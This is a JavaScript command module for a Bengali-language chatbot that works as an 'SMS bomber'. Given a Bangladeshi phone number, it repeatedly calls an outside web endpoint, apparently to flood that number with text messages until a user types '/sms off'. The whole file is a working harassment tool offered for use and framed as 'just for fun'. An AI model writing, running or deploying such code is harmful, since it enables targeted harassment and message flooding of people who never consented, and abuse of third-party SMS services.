module.exports.config = {
  name: "sms",
  version: "2.0.0",
  role: 2,
  author: "Gok", //ক্রেডিট চেঞ্জ করলে এপিআই বন্ধ করে দেব।
  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off",
  category: "Tool",
  usages: "/sms 01xxxxxxxxx অথবা /sms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};
 
const axios = require("axios");
const bombingFlags = {};
 
module.exports.onStart = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const number = args[0];
 
  if (number === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage("✅ SMS বোম্বার বন্ধ করা হয়েছে।", threadID);
    } else {
      return api.sendMessage("❗এই থ্রেডে কোন বোম্বিং চলছিল না।", threadID);
    }
  }
 
  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage("•┄┅════❁🌺❁════┅┄•\n\n☠️••𝚂𝙼𝚂 𝙱𝙾𝙼𝙱𝙴𝚁 𝙱𝚈 —͟͟͞͞𝚃𝙰𝙽𝚅𝙸𝚃-𝙱𝙾𝚃👾\n\nব্যবহার:\n/𝚜𝚖𝚜 01xxxxxxxxx\n\n(বাংলাদেশি নাম্বার দিন, শুধু মজার জন্য ব্যবহার করুন)\n\n•┄┅════❁🌺❁════┅┄•", threadID);
  }
 
  if (bombingFlags[threadID]) {
    return api.sendMessage("❗এই থ্রেডে ইতিমধ্যে বোম্বিং চলছে! বন্ধ করতে /𝚜𝚖𝚜 𝚘𝚏𝚏", threadID);
  }
 
  api.sendMessage(`-𝚂𝙼𝚂 বোম্বিং শুরু হয়েছে ${number} নম্বরে...\nবন্ধ করতে /𝚜𝚖𝚜 off`, threadID);
 
  bombingFlags[threadID] = true;
 
  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
      } catch (err) {
        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
        bombingFlags[threadID] = false;
        break;
      }
    }
  })();
};
